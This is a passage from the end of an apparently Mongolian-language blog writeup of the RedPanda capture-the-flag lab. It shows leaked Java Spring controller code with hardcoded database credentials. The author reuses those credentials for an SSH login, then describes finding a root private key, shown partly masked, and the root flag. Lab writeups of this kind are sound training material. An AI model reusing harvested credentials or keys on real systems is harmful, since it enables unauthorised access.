</span></span><span style=display:flex><span>		       	List<span style=color:#f92672>&amp;</span>lt;Element<span style=color:#f92672>&amp;</span>gt; images <span style=color:#f92672>=</span> rootElement.<span style=color:#a6e22e>getChildren</span>(<span style=color:#f92672>&amp;</span>quot;image<span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>for</span>(Element image: images)
</span></span><span style=display:flex><span>				System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(image.<span style=color:#a6e22e>getChildText</span>(<span style=color:#f92672>&amp;</span>quot;uri<span style=color:#f92672>&amp;</span>quot;));
</span></span><span style=display:flex><span>			model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;noAuthor<span style=color:#f92672>&amp;</span>quot;, <span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>			model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;author<span style=color:#f92672>&amp;</span>quot;, author);
</span></span><span style=display:flex><span>			model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;totalviews<span style=color:#f92672>&amp;</span>quot;, totalviews);
</span></span><span style=display:flex><span>			model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;images<span style=color:#f92672>&amp;</span>quot;, images);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> ModelAndView(<span style=color:#f92672>&amp;</span>quot;stats.<span style=color:#a6e22e>html</span><span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;noAuthor<span style=color:#f92672>&amp;</span>quot;, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> ModelAndView(<span style=color:#f92672>&amp;</span>quot;stats.<span style=color:#a6e22e>html</span><span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>@GetMapping</span>(value<span style=color:#f92672>=&amp;</span>quot;<span style=color:#f92672>/</span>export.<span style=color:#a6e22e>xml</span><span style=color:#f92672>&amp;</span>quot;, produces <span style=color:#f92672>=</span> MediaType.<span style=color:#a6e22e>APPLICATION_OCTET_STREAM_VALUE</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#a6e22e>@ResponseBody</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>exportXML</span>(<span style=color:#a6e22e>@RequestParam</span>(name<span style=color:#f92672>=&amp;</span>quot;author<span style=color:#f92672>&amp;</span>quot;, defaultValue<span style=color:#f92672>=&amp;</span>quot;err<span style=color:#f92672>&amp;</span>quot;) String author) <span style=color:#66d9ef>throws</span> IOException {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#f92672>&amp;</span>quot;Exporting xml of: <span style=color:#f92672>&amp;</span>quot; <span style=color:#f92672>+</span> author);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(author.<span style=color:#a6e22e>equals</span>(<span style=color:#f92672>&amp;</span>quot;woodenk<span style=color:#f92672>&amp;</span>quot;) <span style=color:#f92672>||</span> author.<span style=color:#a6e22e>equals</span>(<span style=color:#f92672>&amp;</span>quot;damian<span style=color:#f92672>&amp;</span>quot;))
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			InputStream in <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileInputStream(<span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>/</span>credits<span style=color:#f92672>/&amp;</span>quot; <span style=color:#f92672>+</span> author <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span>quot;_creds.<span style=color:#a6e22e>xml</span><span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>			System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(in);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> IOUtils.<span style=color:#a6e22e>toByteArray</span>(in);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> IOUtils.<span style=color:#a6e22e>toByteArray</span>(<span style=color:#f92672>&amp;</span>quot;Error, incorrect paramenter <span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span>39;author<span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span>39;<span style=color:#960050;background-color:#1e0010>\</span>n<span style=color:#960050;background-color:#1e0010>\</span>r<span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>@PostMapping</span>(<span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>/</span>search<span style=color:#f92672>&amp;</span>quot;)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> ModelAndView <span style=color:#a6e22e>search</span>(<span style=color:#a6e22e>@RequestParam</span>(<span style=color:#f92672>&amp;</span>quot;name<span style=color:#f92672>&amp;</span>quot;) String name, Model model) {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(name.<span style=color:#a6e22e>isEmpty</span>())
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		name <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>quot;Greg<span style=color:#f92672>&amp;</span>quot;;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>        String query <span style=color:#f92672>=</span> filter(name);
</span></span><span style=display:flex><span>	ArrayList pandas <span style=color:#f92672>=</span> searchPanda(query);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#f92672>&amp;</span>quot;<span style=color:#960050;background-color:#1e0010>\</span>n<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>+</span>query<span style=color:#f92672>+&amp;</span>quot;<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>&amp;</span>quot;<span style=color:#960050;background-color:#1e0010>\</span>n<span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>        model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;query<span style=color:#f92672>&amp;</span>quot;, query);
</span></span><span style=display:flex><span>	model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;pandas<span style=color:#f92672>&amp;</span>quot;, pandas);
</span></span><span style=display:flex><span>	model.<span style=color:#a6e22e>addAttribute</span>(<span style=color:#f92672>&amp;</span>quot;n<span style=color:#f92672>&amp;</span>quot;, pandas.<span style=color:#a6e22e>size</span>());
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> ModelAndView(<span style=color:#f92672>&amp;</span>quot;search.<span style=color:#a6e22e>html</span><span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>filter</span>(String arg) {
</span></span><span style=display:flex><span>        String<span style=color:#f92672>[]</span> no_no_words <span style=color:#f92672>=</span> {<span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>%&amp;</span>quot;, <span style=color:#f92672>&amp;</span>quot;_<span style=color:#f92672>&amp;</span>quot;,<span style=color:#f92672>&amp;</span>quot;$<span style=color:#f92672>&amp;</span>quot;, <span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>~&amp;</span>quot;, };
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (String word : no_no_words) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(arg.<span style=color:#a6e22e>contains</span>(word)){
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#f92672>&amp;</span>quot;Error occured: banned characters<span style=color:#f92672>&amp;</span>quot;;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> arg;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ArrayList <span style=color:#a6e22e>searchPanda</span>(String query) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Connection conn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        PreparedStatement stmt <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        ArrayList<span style=color:#f92672>&amp;</span>lt;ArrayList<span style=color:#f92672>&amp;</span>gt; pandas <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            Class.<span style=color:#a6e22e>forName</span>(<span style=color:#f92672>&amp;</span>quot;com.<span style=color:#a6e22e>mysql</span>.<span style=color:#a6e22e>cj</span>.<span style=color:#a6e22e>jdbc</span>.<span style=color:#a6e22e>Driver</span><span style=color:#f92672>&amp;</span>quot;);
</span></span><span style=display:flex><span>            conn <span style=color:#f92672>=</span> DriverManager.<span style=color:#a6e22e>getConnection</span>(<span style=color:#f92672>&amp;</span>quot;jdbc:mysql:<span style=color:#75715e>//localhost:3306/red_panda&amp;quot;, &amp;quot;woodenk&amp;quot;, &amp;quot;RedPandazRule&amp;quot;);</span>
</span></span><span style=display:flex><span>            stmt <span style=color:#f92672>=</span> conn.<span style=color:#a6e22e>prepareStatement</span>(<span style=color:#f92672>&amp;</span>quot;SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE <span style=color:#f92672>?&amp;</span>quot;);
</span></span><span style=display:flex><span>            stmt.<span style=color:#a6e22e>setString</span>(1, <span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>%&amp;</span>quot; <span style=color:#f92672>+</span> query <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span>quot;<span style=color:#f92672>%&amp;</span>quot;);
</span></span><span style=display:flex><span>            ResultSet rs <span style=color:#f92672>=</span> stmt.<span style=color:#a6e22e>executeQuery</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span>(rs.<span style=color:#a6e22e>next</span>()){
</span></span><span style=display:flex><span>                ArrayList<span style=color:#f92672>&amp;</span>lt;String<span style=color:#f92672>&amp;</span>gt; panda <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&amp;</span>lt;String<span style=color:#f92672>&amp;</span>gt;();
</span></span><span style=display:flex><span>                panda.<span style=color:#a6e22e>add</span>(rs.<span style=color:#a6e22e>getString</span>(<span style=color:#f92672>&amp;</span>quot;name<span style=color:#f92672>&amp;</span>quot;));
</span></span><span style=display:flex><span>                panda.<span style=color:#a6e22e>add</span>(rs.<span style=color:#a6e22e>getString</span>(<span style=color:#f92672>&amp;</span>quot;bio<span style=color:#f92672>&amp;</span>quot;));
</span></span><span style=display:flex><span>                panda.<span style=color:#a6e22e>add</span>(rs.<span style=color:#a6e22e>getString</span>(<span style=color:#f92672>&amp;</span>quot;imgloc<span style=color:#f92672>&amp;</span>quot;));
</span></span><span style=display:flex><span>		panda.<span style=color:#a6e22e>add</span>(rs.<span style=color:#a6e22e>getString</span>(<span style=color:#f92672>&amp;</span>quot;author<span style=color:#f92672>&amp;</span>quot;));
</span></span><span style=display:flex><span>                pandas.<span style=color:#a6e22e>add</span>(panda);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>catch</span>(Exception e){ System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(e);}
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> pandas;
</span></span></code></pre></div><p>user: <code>woodenk</code>
password: <code>RedPandazRule</code></p><p>ssh login:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh woodenk@redpanda.htb
</span></span></code></pre></div><p>User-р ороод privesc_creds.xm харвал дотор нь root id_rsa байна.
root id_rsa</p><pre tabindex=0><code>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA*********************
-----END OPENSSH PRIVATE KEY-----
</code></pre><p>root.txt</p><pre tabindex=0><code>0113fc74******
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>